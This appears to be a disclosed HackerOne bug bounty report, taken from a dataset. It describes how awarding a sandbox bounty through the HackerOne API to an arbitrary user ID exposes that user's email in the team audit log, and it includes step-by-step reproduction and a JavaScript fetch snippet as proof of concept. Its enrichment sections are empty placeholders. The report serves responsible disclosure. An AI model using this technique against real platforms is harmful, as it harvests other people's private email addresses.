---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2382120'
original_report_id: '2382120'
title: View any user email using the Team's audit log section
weakness: Information Disclosure
team_handle: security
created_at: '2024-03-06T16:29:05.276Z'
disclosed_at: '2024-03-26T14:00:46.469Z'
has_bounty: true
visibility: full
substate: duplicate
vote_count: 46
asset_identifier: api.hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# View any user email using the Team's audit log section

## Metadata

- HackerOne Report ID: 2382120
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2024-03-26T14:00:46.469Z
- Has Bounty: Yes
- Visibility: full
- Substate: duplicate

## Original Report

**Summary:**
Hello team, I decided to do some further testing, and I came across another endpoint that can be used to reveal user emails. 

### Steps To Reproduce

1. Create a demo in your account https://hackerone.com/teams/new/sandbox
2. Create a token with the report manager role on https://hackerone.com/organizations/demo/settings/api_tokens
3. Copy the user ID of any user that has an account on HackerOne
4. A program bounty to that user using the API. `recipient_id` is the id of any user and `{id}` is the id of your sandbox program.
```
let inputBody = "{\n  \"data\": {\n    \"type\": \"bounty\",\n    \"attributes\": {\n      \"recipient_id\": \"2869549\",\n          \"amount\": 51,\n      \"reference\": \"newbounty1\",\n      \"title\": \"BOUNTY\",\n      \"currency\": \"USD\",\n      \"severity_rating\": \"high\"\n    }\n  }\n}";
let user = 'identifier';
let password = 'token';
let headers = new Headers();
headers.set('Authorization', 'Basic ' + btoa(user + ":" + password));
  headers.set('Content-Type', 'application/json');  headers.set('Accept', 'application/json');

fetch('https://api.hackerone.com/v1/programs/{id}/bounties',
{
  method: 'POST',
  body: inputBody,
  headers: headers
})
.then(function(res) {
    return res.json();
}).then(function(body) {
    console.log(body);
});
```
5. You will get a success message
6. After awarding the bounty to the user, head over to the audit log section of your sandbox team.
7. Notice a message is shown `"@api" awarded a $51.00 bounty to "email@email.com"`

POC
████

## Impact

View emails of other users

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
